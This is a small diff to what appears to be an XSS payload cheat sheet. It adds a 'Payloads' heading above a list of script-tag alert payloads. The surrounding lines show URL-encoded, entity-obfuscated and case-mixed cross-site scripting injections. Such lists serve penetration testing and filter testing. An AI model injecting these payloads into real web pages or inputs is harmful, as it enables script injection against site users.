@@ -102,6 +102,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <a href=javas&#99;ript:alert(1)>
 ```
 
+<b>Payloads</b>
 ```javascript
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
